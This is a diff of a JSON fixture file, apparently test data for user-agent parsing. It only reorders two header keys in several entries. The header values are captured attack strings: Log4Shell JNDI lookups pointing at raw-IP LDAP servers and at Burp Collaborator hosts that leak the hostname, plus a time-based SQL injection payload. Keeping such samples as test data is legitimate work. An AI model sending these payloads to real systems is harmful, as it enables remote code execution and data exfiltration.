@@ -1135,8 +1135,8 @@
   },
   {
     "headers": {
-      "user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit} fcbz",
-      "x-original-user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit}"
+      "x-original-user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit}",
+      "user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit} fcbz"
     },
     "device": {
       "architecture": null,
@@ -1178,8 +1178,8 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR';if(now()=sysdate(),sleep(25),0)/*'XOR(if(now()=sysdate(),sleep(25),0))OR';\"XOR(if(now()=sysdate(),sleep(25),0))OR\"*/ fcbz",
-      "x-original-user-agent": "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'"
+      "x-original-user-agent": "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
+      "user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR';if(now()=sysdate(),sleep(25),0)/*'XOR(if(now()=sysdate(),sleep(25),0))OR';\"XOR(if(now()=sysdate(),sleep(25),0))OR\"*/ fcbz"
     },
     "device": {
       "architecture": null,
@@ -2943,8 +2943,8 @@
   },
   {
     "headers": {
-      "user-agent": "${jndi:ldap://173.212.215.164:1389/a} fcbz",
-      "x-original-user-agent": "${jndi:ldap://173.212.215.164:1389/a}"
+      "x-original-user-agent": "${jndi:ldap://173.212.215.164:1389/a}",
+      "user-agent": "${jndi:ldap://173.212.215.164:1389/a} fcbz"
     },
     "device": {
       "architecture": null,
@@ -2986,8 +2986,8 @@
   },
   {
     "headers": {
-      "user-agent": "${jndi:ldap://x${hostName}.geld.de.useragent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a} fcbz",
-      "x-original-user-agent": "${jndi:ldap://x${hostName}.geld.de.xOrigionalUserAgent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}"
+      "x-original-user-agent": "${jndi:ldap://x${hostName}.geld.de.xOrigionalUserAgent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
+      "user-agent": "${jndi:ldap://x${hostName}.geld.de.useragent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a} fcbz"
     },
     "device": {
       "architecture": null,
@@ -3911,8 +3911,8 @@
   },
   {
     "headers": {
-      "user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.useragent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a} fcbz",
-      "x-original-user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalUserAgent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}"
+      "x-original-user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalUserAgent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.useragent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a} fcbz"
     },
     "device": {
       "architecture": null,
